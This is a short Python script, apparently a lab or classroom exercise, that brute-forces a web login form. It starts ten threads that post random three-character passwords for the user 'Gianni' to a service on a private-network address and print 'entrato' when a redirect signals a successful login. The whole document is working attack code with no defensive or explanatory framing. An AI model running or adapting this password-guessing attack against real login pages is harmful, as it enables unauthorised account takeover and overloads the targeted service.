import requests
import string
import threading as thr
import sys
import random

check=True

class atk_thr(thr.Thread):
    def __init__(self):
        thr.Thread.__init__(self)
        self.url="http://192.168.0.136:5000/"
        self.an=string.printable[:-38]
    def run(self):
        while check:
            for _ in range(62):
                for _ in range(62):
                    for _ in range(62):
                        psw=f"{self.an[random.randint(0,len(self.an)-1)]}{self.an[random.randint(0,len(self.an)-1)]}{self.an[random.randint(0,len(self.an)-1)]}"
                        x=requests.post(self.url,data={'username':'Gianni','password':psw})
                        print(psw)
                        if x.url != self.url:
                            print("entrato")
                            sys.exit()

for _ in range(10):
    trd=atk_thr()
    trd.start()